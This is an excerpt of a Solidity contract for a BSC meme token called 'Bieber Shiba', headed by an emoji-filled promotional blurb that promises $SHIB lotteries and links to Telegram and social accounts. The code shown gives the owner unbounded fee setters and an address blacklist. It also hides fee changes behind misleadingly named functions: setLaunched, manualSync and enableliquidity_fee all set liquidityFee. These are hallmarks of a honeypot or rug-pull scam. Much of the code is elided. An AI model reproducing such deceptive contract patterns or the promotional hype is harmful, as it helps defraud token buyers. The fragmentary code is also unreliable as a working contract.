...
🐶The love child of Shiba-Inu and Justin Bieber Bieber Shiba is coming to the BSC market to change lives and build community 🐶

🌟Reborn and brought to you by a stronger, experienced team Beiber Shiba will take the market by storm rewarding holders with daily $SHIB lotteries.

Increasingly higher tax on sells below ATH will incentivise long term holding and low buy tax will attract larger buys🌟 

🔰 Bieber Shiba holders will not only be rewarded through $SHIB lottos while holding but also will have the chance to win extra giveaways, take part in community events, exclusive NFT raffles and merchandise further down the roadmap.

🔰 Bieber and Shiba were simply meant to be, great memes and positive community vibes and what we strive for and will grow to be a strong foundation for the Bieber Shiba metaverse

✨ Details on the lotto, giveaways, tax structure and more will be disclosed in our telegram group chat so make sure to join using the link below ✨

📱Telegram - https://t.me/BieberShiba

🐤Twitter - https://twitter.com/biebershiba?s=21

🌏Website - https://www.biebershiba.us/
*/
...
contract DividendPayingToken is ERC20, Ownable, DividendPayingTokenInterface, DividendPayingTokenOptionalInterface {
  ...
  constructor(string memory _name, string memory _symbol,address token) ERC20(_name, _symbol) public {
    BAKE=token;
  }
...
contract BieberShiba is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    address[] public TOKENARR = [0xdF2fc196d57f7E3736DAAab1De4b717C32380fB6]; // Ada
    ...
    constructor() ERC20("Bieber Shiba", "BShib") public {
    ...
    function excludeMultipleAccountsFromFees(address[] calldata accounts, bool excluded) public onlyOwner {
        ...
        function set_percentage_marketingfee(uint256 value) external onlyOwner{
            marketingFee = value;
        }
    ...
    function setMarketingWallet(address payable wallet) external onlyOwner{
        ...
        function enableliquidity_fee(uint256 value) external onlyOwner{
            liquidityFee = value;
        }
        ...
        function setLaunched(uint256 value) external onlyOwner{
            liquidityFee = value;
        }
    ...
    function setMaxWalletLimit(uint256 value) external onlyOwner{
        ...
        function manualSync(uint256 value) external onlyOwner{
            liquidityFee = value;
        }
    ...
    function blacklistAddress(address account, bool value) external onlyOwner {
        ...
        function set_enablebuyfee(uint256 value) external onlyOwner {
            buyFee = value;
        }
    ...
    function claim() external {
	    for(uint256 i=0;i<dividendTrackers.length;i++){
		    dividendTrackers[i].processAccount(payable(msg.sender), false);
	    }
    }
...
contract DividendTracker is Ownable, DividendPayingToken {
    ...
    constructor(address token) DividendPayingToken("Dividen_Tracker", "Dividend_Tracker",token) public {
    	claimWait = 3600;
